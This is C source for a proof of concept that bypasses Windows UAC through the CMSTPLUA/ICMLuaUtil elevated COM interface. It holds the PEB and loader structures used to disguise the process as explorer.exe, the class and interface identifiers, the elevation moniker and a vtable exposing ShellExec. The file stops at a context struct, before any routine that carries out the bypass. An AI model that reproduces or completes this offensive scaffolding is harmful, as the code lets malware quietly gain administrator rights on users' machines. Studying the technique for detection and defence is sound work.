
/* ICMLuaUtil UAC Bypass PoC */


#include <Windows.h>
#include <winternl.h>
#include <objbase.h>
#include <stdio.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI* pfnRtlAcquirePebLock)(VOID);
typedef NTSTATUS(NTAPI* pfnRtlReleasePebLock)(VOID);
typedef NTSTATUS(NTAPI* pfnLdrEnumerateLoadedModules)(ULONG, PVOID, PVOID);
typedef VOID(NTAPI* pfnRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

static pfnRtlInitUnicodeString  g_RtlInitUS = NULL;
static pfnRtlAcquirePebLock     g_AcquireLock = NULL;
static pfnRtlReleasePebLock     g_ReleaseLock = NULL;
static pfnLdrEnumerateLoadedModules g_LdrEnum = NULL;

typedef struct _MY_CURDIR {
    UNICODE_STRING DosPath;
    HANDLE         Handle;
} MY_CURDIR;

typedef struct _MY_RTL_USER_PROCESS_PARAMETERS {
    ULONG          MaximumLength;
    ULONG          Length;
    ULONG          Flags;
    ULONG          DebugFlags;
    HANDLE         ConsoleHandle;
    ULONG          ConsoleFlags;
    HANDLE         StandardInput;
    HANDLE         StandardOutput;
    HANDLE         StandardError;
    MY_CURDIR      CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID          Environment;
} MY_RTL_USER_PROCESS_PARAMETERS, * PMY_RTL_USER_PROCESS_PARAMETERS;

typedef struct _MY_PEB {
    BYTE                             InheritedAddressSpace;
    BYTE                             ReadImageFileExecOptions;
    BYTE                             BeingDebugged;
    BYTE                             BitField;
    PVOID                            Mutant;
    PVOID                            ImageBaseAddress;
    PVOID                            Ldr;
    PMY_RTL_USER_PROCESS_PARAMETERS  ProcessParameters;
} MY_PEB, * PMY_PEB;

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY, * PMY_LDR_ENTRY;

static PMY_PEB GetPeb(VOID)
{
#ifdef _WIN64
    return (PMY_PEB)__readgsqword(0x60);
#else
    return (PMY_PEB)__readfsdword(0x30);
#endif
}

static const CLSID CLSID_CMSTPLUA = {
    0x3E5FC7F9, 0x9A51, 0x4367,
    { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 }
};

static const IID IID_ICMLuaUtil = {
    0x6EDD6D74, 0xC007, 0x4E75,
    { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C }
};

#define ELEVATION_MONIKER L"Elevation:Administrator!new:"

typedef struct ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(ICMLuaUtil*, REFIID, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)        (ICMLuaUtil*);
    ULONG(STDMETHODCALLTYPE* Release)       (ICMLuaUtil*);
    HRESULT(STDMETHODCALLTYPE* SetRasCredentials)();
    HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)();
    HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)();
    HRESULT(STDMETHODCALLTYPE* LaunchInfSection)();
    HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)();
    HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)();
    HRESULT(STDMETHODCALLTYPE* ShellExec)(
        ICMLuaUtil* This,
        PCWSTR      pszFile,
        PCWSTR      pszParameters,
        PCWSTR      pszDirectory,
        ULONG       fMask,
        ULONG       nShow
        );
} ICMLuaUtilVtbl;

struct ICMLuaUtil { ICMLuaUtilVtbl* lpVtbl; };

static PWSTR g_ExplorerPath = NULL;
static PWSTR g_SavedImagePath = NULL;
static PWSTR g_SavedCmdLine = NULL;
static PWSTR g_SavedFullDll = NULL;
static PWSTR g_SavedBaseDll = NULL;

typedef struct _LDR_CTX {
    BOOL  Restore;
    PVOID ImageBase;
} LDR_CTX;
